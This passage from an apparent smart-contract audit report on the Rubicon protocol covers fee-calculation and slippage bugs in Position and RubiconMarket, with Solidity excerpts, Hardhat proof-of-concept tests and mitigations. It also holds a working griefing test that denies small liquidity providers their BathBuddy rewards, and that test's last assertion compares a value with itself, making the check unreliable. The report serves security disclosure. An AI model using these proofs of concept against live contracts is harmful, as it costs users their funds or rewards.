        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);

        // yet, owner receives 5624943 asset tokens
        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);
        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);

        // owner receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000
        expect(5624943).to.be.gt(5624437);
      });
```

### Tools Used

VSCode

### Recommended Mitigation Steps

The `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.

**[bghughes (Rubicon) confirmed via duplicate issue #1025](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1025#issuecomment-1533741057)**

**[HickupHH3 (judge) decreased severity to Medium](https://github.com/code-423n4/2023-04-rubicon-findings/issues/903#issuecomment-1564428688)**

***

## [[M-14] Incorrect calculations can occur when calling `Position._marketBuy` and `Position._marketSell` functions that do not include maker fee in `_fee`](https://github.com/code-423n4/2023-04-rubicon-findings/issues/902)
*Submitted by [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/902), also found by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1321), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1306), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1209), [bin2chen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/869), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/613), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/563), [said](https://github.com/code-423n4/2023-04-rubicon-findings/issues/534), [anodaram](https://github.com/code-423n4/2023-04-rubicon-findings/issues/502), [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/460), [RaymondFam](https://github.com/code-423n4/2023-04-rubicon-findings/issues/375), [MalfurionWhitehat](https://github.com/code-423n4/2023-04-rubicon-findings/issues/338), [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/311) and [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/240)*.

When the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473>

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);
        uint256 _buyAmount = rubiconMarket.getBuyAmount(
            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511>

```solidity
    function _marketSell(
        address _asset,
        address _quote,
        uint256 _minFill
    ) internal {
        uint256 _feeBPS = rubiconMarket.getFeeBPS();
        uint256 _fee = _minFill.mul(_feeBPS).div(10000);
        uint256 _payAmount = rubiconMarket.getPayAmount(
            ERC20(_asset),
            ERC20(_quote),
            _minFill.add(_fee)
        );
        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));

        /// @dev recalculate fee in _asset form
        _fee = _payAmount.mul(_feeBPS).div(10000);

        if (_assetBalance < _payAmount) {
            IERC20(_asset).transferFrom(
                msg.sender,
                address(this),
                _payAmount.sub(_assetBalance).add(_fee)
            );
        }

        IERC20(_asset).approve(
            address(rubiconMarket),
            IERC20(_asset).balanceOf(address(this))
        );

        rubiconMarket.sellAllAmount(
            ERC20(_asset),
            _payAmount,
            ERC20(_quote),
            _minFill
        );
    }
```

When the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448>

```solidity
    function buy(
        uint256 id,
        uint256 quantity
    ) public virtual can_buy(id) synchronized returns (bool) {
        OfferInfo memory _offer = offers[id];
        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;

        require(uint128(spend) == spend, "spend is not an int");
        require(uint128(quantity) == quantity, "quantity is not an int");

        ///@dev For backwards semantic compatibility.
        if (
            quantity == 0 ||
            spend == 0 ||
            quantity > _offer.pay_amt ||
            spend > _offer.buy_amt
        ) {
            return false;
        }

        offers[id].pay_amt = sub(_offer.pay_amt, quantity);
        offers[id].buy_amt = sub(_offer.buy_amt, spend);

        /// @dev Fee logic added on taker trades
        uint256 fee = mul(spend, feeBPS) / 100_000;
        require(
            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),
            "Insufficient funds to cover fee"
        );

        // taker pay maker 0_0
        if (makerFee() > 0) {
            uint256 mFee = mul(spend, makerFee()) / 100_000;

            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient
            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {
                require(
                    _offer.buy_gem.transferFrom(
                        msg.sender,
                        _offer.recipient,
                        mFee
                    ),
                    "Insufficient funds to cover fee"
                );
            } else {
                require(
                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),
                    "Insufficient funds to cover fee"
                );
            }

            ...
        }
        ...
    }
```

Since the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.

### Proof of Concept

First, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled "Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations".

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        /** @audit divide by 100_000 for POC purpose */
        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);
        /** */

        uint256 _buyAmount = rubiconMarket.getBuyAmount(
            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

Second, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\hardhat-tests\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.

```
      it.only("changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee", async function () {
        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =
          await loadFixture(deployPoolsUtilityFixture);

        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function
        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);

        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function
        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);

        // there is a maker fee
        const fee = 50;
        await rubiconMarket.setMakerFee(fee);

        // owner calls Position.buyAllAmountWithLeverage function
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT,
          x1_25
        );

        // owner sends 25000000000000000000 quote tokens
        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);
        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);

        // owner receives 5624942 asset tokens
        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);
        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);
      });
```

Third, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        /** @audit divide by 100_000 for POC purpose */
        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);
        /** */

        /** @audit consider maker fee for POC purpose */
        if (rubiconMarket.makerFee() > 0) {
            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;
        }
        /** */

        uint256 _buyAmount = rubiconMarket.getBuyAmount(
            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

Fourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\hardhat-tests\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.

```
      it.only("changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee", async function () {
        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =
          await loadFixture(deployPoolsUtilityFixture);

        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function
        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);

        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function
        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);

        // there is a maker fee
        const fee = 50;
        await rubiconMarket.setMakerFee(fee);

        // owner calls Position.buyAllAmountWithLeverage function
        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT,
          x1_25
        );

        // owner still sends 25000000000000000000 quote tokens
        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);
        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);

        // yet, owner receives 5622129 asset tokens
        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);
        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);

        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee
        expect(5622129).to.be.lt(5624942);
      });
```

### Tools Used

VSCode

### Recommended Mitigation Steps

The `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.

**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/902#issuecomment-1565174337):**
 > As mentioned in [#282](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282), issues with the market's implementation make it difficult for me to claim that `_marketBuy()` and `_marketSell()` shouldn't be accounting for fees at all.
> 
> Thus, I am separating this issue from [#282](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282) and [#1312](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1312)


***

## [[M-15] Calling `Position._marketSell` function compares `fill_amt` that includes fee to `min_fill_amount` that does not include fee](https://github.com/code-423n4/2023-04-rubicon-findings/issues/899)
*Submitted by [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/899), also found by [volodya](https://github.com/code-423n4/2023-04-rubicon-findings/issues/216)*.

Calling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511>

```solidity
    function _marketSell(
        address _asset,
        address _quote,
        uint256 _minFill
    ) internal {
        uint256 _feeBPS = rubiconMarket.getFeeBPS();
        uint256 _fee = _minFill.mul(_feeBPS).div(10000);
        uint256 _payAmount = rubiconMarket.getPayAmount(
            ERC20(_asset),
            ERC20(_quote),
            _minFill.add(_fee)
        );
        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));

        /// @dev recalculate fee in _asset form
        _fee = _payAmount.mul(_feeBPS).div(10000);

        if (_assetBalance < _payAmount) {
            IERC20(_asset).transferFrom(
                msg.sender,
                address(this),
                _payAmount.sub(_assetBalance).add(_fee)
            );
        }

        IERC20(_asset).approve(
            address(rubiconMarket),
            IERC20(_asset).balanceOf(address(this))
        );

        rubiconMarket.sellAllAmount(
            ERC20(_asset),
            _payAmount,
            ERC20(_quote),
            _minFill
        );
    }
```

Calling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067>

```solidity
    function sellAllAmount(
        ERC20 pay_gem,
        uint256 pay_amt,
        ERC20 buy_gem,
        uint256 min_fill_amount
    ) external returns (uint256 fill_amt) {
        require(!locked);

        uint256 offerId;
        while (pay_amt > 0) {
            //while there is amount to sell
            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair
            require(offerId != 0, "0 offerId"); //Fails if there are not more offers

            // There is a chance that pay_amt is smaller than 1 wei of the other token
            if (
                mul(pay_amt, 1 ether) <
                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)
            ) {
                break; //We consider that all amount is sold
            }
            if (pay_amt >= offers[offerId].buy_amt) {
                //If amount to sell is higher or equal than current offer amount to buy
                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator
                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell
                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer
            } else {
                // if lower
                uint256 baux = rmul(
                    mul(pay_amt, 10 ** 9),
                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)
                ) / 10 ** 9;
                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator
                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need
                pay_amt = 0; //All amount is sold
            }
        }
        require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled");
        fill_amt = calcAmountAfterFee(fill_amt);
    }
```

### Proof of Concept

First, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled "Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations".

```solidity
    function _marketSell(
        address _asset,
        address _quote,
        uint256 _minFill
    ) internal {
        uint256 _feeBPS = rubiconMarket.getFeeBPS();

        /** @audit divide by 100_000 for POC purpose */
        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);
        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);
        /** */

        uint256 _payAmount = rubiconMarket.getPayAmount(
            ERC20(_asset),
            ERC20(_quote),
            _minFill.add(_fee)
        );
        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));

        /** @audit divide by 100_000 for POC purpose */
        /// @dev recalculate fee in _asset form
        // _fee = _payAmount.mul(_feeBPS).div(10000);
        _fee = _payAmount.mul(_feeBPS).div(100_000);
        /** */

        if (_assetBalance < _payAmount) {
            IERC20(_asset).transferFrom(
                msg.sender,
                address(this),
                _payAmount.sub(_assetBalance).add(_fee)
            );
        }

        IERC20(_asset).approve(
            address(rubiconMarket),
            IERC20(_asset).balanceOf(address(this))
        );

        rubiconMarket.sellAllAmount(
            ERC20(_asset),
            _payAmount,
            ERC20(_quote),
            _minFill
        );
    }
```

Second, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose.

```solidity
    function sellAllAmount(
        ERC20 pay_gem,
        uint256 pay_amt,
        ERC20 buy_gem,
        uint256 min_fill_amount
    ) external returns (uint256 fill_amt) {
        require(!locked);

        uint256 offerId;
        while (pay_amt > 0) {
            //while there is amount to sell
            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair
            require(offerId != 0, "0 offerId"); //Fails if there are not more offers

            // There is a chance that pay_amt is smaller than 1 wei of the other token
            if (
                mul(pay_amt, 1 ether) <
                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)
            ) {
                break; //We consider that all amount is sold
            }
            if (pay_amt >= offers[offerId].buy_amt) {
                //If amount to sell is higher or equal than current offer amount to buy
                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator
                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell
                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer
            } else {
                // if lower
                uint256 baux = rmul(
                    mul(pay_amt, 10 ** 9),
                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)
                ) / 10 ** 9;
                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator
                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need
                pay_amt = 0; //All amount is sold
            }
        }

        /** @audit console.log min_fill_amount for POC purpose */
        console.log("min_fill_amount:");
        console.log(min_fill_amount);
        console.log("");
        /** */

        /** @audit console.log fill_amt for POC purpose */
        console.log("fill_amt that includes fee:");
        console.log(fill_amt);
        console.log("");

        console.log("Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?");
        console.log(fill_amt > min_fill_amount);
        console.log("");
        /** */

        require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled");
        fill_amt = calcAmountAfterFee(fill_amt);

        /** @audit console.log fill_amt with fee deducted for POC purpose */
        console.log("fill_amt with fee deducted:");
        console.log(fill_amt);
        console.log("");

        console.log("Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?");
        console.log(fill_amt == min_fill_amount);
        console.log("");
        /** */
    }
```

Third, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\hardhat-tests\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario:

```
      it.only("Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee", async function () {
        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =
          await loadFixture(deployPoolsUtilityFixture);

        await Position.connect(owner).buyAllAmountWithLeverage(
          testCoin.address,
          testStableCoin.address,
          TEST_AMOUNT,
          x1_25
        );

        await rubiconMarket.functions["offer(uint256,address,uint256,address)"](
          parseUnits("1300", 6),
          testStableCoin.address,
          parseUnits("1000"),
          testCoin.address,
          { from: owner.address }
        );

        // Call Position.closePosition function, which further calls Position._marketSell function.
        // console.logs in RubiconMarket.sellAllAmount function show that
        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and
        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.
        await Position.connect(owner).closePosition(1);
      });
```

```solidity
min_fill_amount:
5625001

fill_amt that includes fee:
5625057

Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?
true

fill_amt with fee deducted:
5625001

Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?
true
```

### Tools Used

VSCode

### Recommended Mitigation Steps

The `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/899#issuecomment-1564548373):**
 > It's unclear to me whether `min_fill_amt` should be inclusive or exclusive of fees because the `sellAllAmount()` function itself is buggy with regards to fee accounting: the `fill_amt` fails to account for fees because the offer isn't entirely filled because of fee inclusivity, so it's an inflated value.
> 
> The fee is also charged on the `pay_amt`, not sure if incrementing it in the `min_fill_amt` entirely mitigates the issue.

***

## [[M-16] `BathBuddy` rewards DoS](https://github.com/code-423n4/2023-04-rubicon-findings/issues/854)
*Submitted by [Tricko](https://github.com/code-423n4/2023-04-rubicon-findings/issues/854)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135> <br><https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155>

As described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.

### Proof of Concept

`BathBuddy`'s user rewards are calculated as shown below:

```solidity
function earned(
        address account,
        address token
    ) public view override returns (uint256) {
        require(friendshipStarted, "I have not started a bathToken friendship");

        return
            IERC20(myBathTokenBuddy) // Care with this?
                .balanceOf(account)
                .mul(
                    rewardPerToken(token).sub(
                        userRewardsPerTokenPaid[token][account]
                    )
                )
                .div(1e18)
                .add(tokenRewards[token][account]);
    }
```

Where `rewardPerToken` values are updated by calling the `rewardPerToken` function:

```solidity
function rewardPerToken(address token) public view returns (uint256) {
        require(friendshipStarted, "I have not started a bathToken friendship");

        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {
            return rewardsPerTokensStored[token];
        }
        return
            rewardsPerTokensStored[token].add(
                lastTimeRewardApplicable(token)
                    .sub(lastUpdateTime[token])
                    .mul(rewardRates[token])
                    .mul(1e18)
                    .div(IERC20(myBathTokenBuddy).totalSupply())
            );
    }
```

As we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore, there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.

This enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`; for example, at every new block (2s on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .

The following test reproduces the above scenario, demonstrating that reward distribution to users with small `bathToken` balances can be completely and indefinitely blocked by repeatedly calling `getReward`:

```
import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, network } from "hardhat";
import { formatUnits, parseUnits } from "ethers/lib/utils";

// TODO: Implement Proxy-wrapping helper functions and proxy-wrapped contracts generally
describe("RubiconV2 rewards system", function () {
  const CERC20_ABI = [
    "function name() external view returns(string memory)",
    "function symbol() external view returns(string memory)",
    "function decimals() external view returns(uint8)",
    "function balanceOf(address) external view returns(uint256)",
    "function admin() external view returns(address)",
    "function mint(uint256) external returns(uint256)",
  ];
  const BUDDY_ABI = [
    "function setRewardsDuration(uint256,address) external",
    "function notifyRewardAmount(uint256,address) external",
    "function earned(address,address) external view returns(uint256)",
  ];

  async function buddySetupFixture() {
    // Contracts are deployed using the first signer/account by default
    const [owner, alice, eve] = await ethers.getSigners();

    // Use Compound Fork to spawn some cTokens...
    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*
    const ComptrollerFactory = await ethers.getContractFactory("Comptroller");
    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?

    const BathHouse = await ethers.getContractFactory("BathHouseV2");
    const bathHouse = await BathHouse.deploy();

    await bathHouse.initialize(comptroller.address, owner.address);

    // Deploy Test ERC20 to use throughout testing
    const testCoinFactory = await ethers.getContractFactory("TokenWithFaucet");
    const testCoin = await testCoinFactory.deploy(
      owner.address,
      "Test",
      "TEST",
      18
    );
    const testStableCoin = await testCoinFactory.deploy(
      owner.address,
      "Test Stablecoin",
      "TUSDC",
      6
    );

    const testRewardCoin = await testCoinFactory
      .connect(owner)
      .deploy(
        owner.address,
        "SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns",
        "BTC",
        18
      );

    const interestRateModelFactory = await ethers.getContractFactory(
      "WhitePaperInterestRateModel"
    );

    // Inputs
    const baseRatePerYear = parseUnits("0.3"); //  TODO: WHAT SHOULD THIS BE?
    const multiplierPerYear = parseUnits("0.02"); //  TODO: WHAT SHOULD THIS BE?
    const irModel = await interestRateModelFactory.deploy(
      baseRatePerYear,
      multiplierPerYear
    );

    const cTokenFactory = await ethers.getContractFactory("CErc20Delegate");
    const cTokenImplementation = await cTokenFactory.deploy();

    // Initialize the market
    const underlying = testCoin.address;
    const interestRateModel = irModel.address;
    const initialExchangeRateMantissa = "200000000000000000000000000"; // TODO: What should this be?

    const becomeImplementationData = "0x"; //TODO: What should this be?

    await bathHouse.createBathToken(
      underlying,
      interestRateModel,
      initialExchangeRateMantissa,
      cTokenImplementation.address,
      becomeImplementationData
    );
    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);
    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);

    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);
    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);

    // Setup cToken in System correctly:
    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {
      console.log("\nError supporting new cToken market!", e.reason, "\n");
    });

    await testCoin.connect(alice).faucet();
    await testStableCoin.connect(alice).faucet();
    await testCoin.connect(eve).faucet();
    await testStableCoin.connect(eve).faucet();

    await buddy.setRewardsDuration(
      365 * 24 * 60 * 60,
      testStableCoin.address
    );
    await testStableCoin.transfer(buddy.address, parseUnits("10000", 6));
    await buddy.notifyRewardAmount(
      parseUnits("10000", 6),
      testStableCoin.address
    );

    await comptroller.setCompAddress(testRewardCoin.address);
    await comptroller._setCompSpeeds(
      [bathTEST.address],
      [parseUnits("2.28")],
      [parseUnits("0.322")]
    );

    const PriceOracleFactory = await ethers.getContractFactory(
      "DummyPriceOracle"
    );
    const priceOracle = await PriceOracleFactory.deploy();

    // price of TEST = $0.9
    await priceOracle.addCtoken(bathTEST.address, parseUnits("0.9", 18));

    await comptroller._setPriceOracle(priceOracle.address);

    await comptroller._setCollateralFactor(bathTEST.address, parseUnits("0.7"));

    const rewardBalance = await testRewardCoin.balanceOf(owner.address);
    await testRewardCoin.transfer(comptroller.address, rewardBalance);

    await testCoin.connect(alice).approve(bathTEST.address, parseUnits("10"));
    await bathTEST.connect(alice).mint(parseUnits("10"));
    await testCoin.connect(eve).approve(bathTEST.address, parseUnits("10000"));
    await bathTEST.connect(eve).mint(parseUnits("10000"));

    return {
      comptroller,
      testCoin,
      bathTEST,
      alice,
      eve,
      testStableCoin,
      testRewardCoin,
      buddy,
      bathHouse,
    };
  }

  describe("Testing the rewards", async function () {
    it("POC1", async function () {
      const {
        alice, 
        eve,
        testStableCoin,
        buddy,
        bathHouse,
      } = await loadFixture(buddySetupFixture);

      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)
      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])
      // Alice tries to claim her rewards
      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])
      const earned1 = await testStableCoin.balanceOf(alice.address);

      // Eve calls claimRewards to reset lastUpdateTime
      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])
      // Alice tries to claim her rewards
      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])
      const earned2 = await testStableCoin.balanceOf(alice.address);
      // Check that Alice didn't get any rewards
      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);

      // Eve calls claimRewards to reset lastUpdateTime
      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])
      // Alice tries to claim her rewards
      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])
      const earned3 = await testStableCoin.balanceOf(alice.address);
      // Check that Alice didn't get any rewards
      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);

      // Eve calls claimRewards to reset lastUpdateTime
      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])
      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])
      const earned4 = await testStableCoin.balanceOf(alice.address);
      // Check that Alice didn't get any rewards
      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);
    });
  });
});
```

**[daoio (Rubicon) acknowledged](https://github.com/code-423n4/2023-04-rubicon-findings/issues/854#issuecomment-1547188063)**


**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/854#issuecomment-1555937451):**
 > Griefing through loss of yield for small LPs.

***
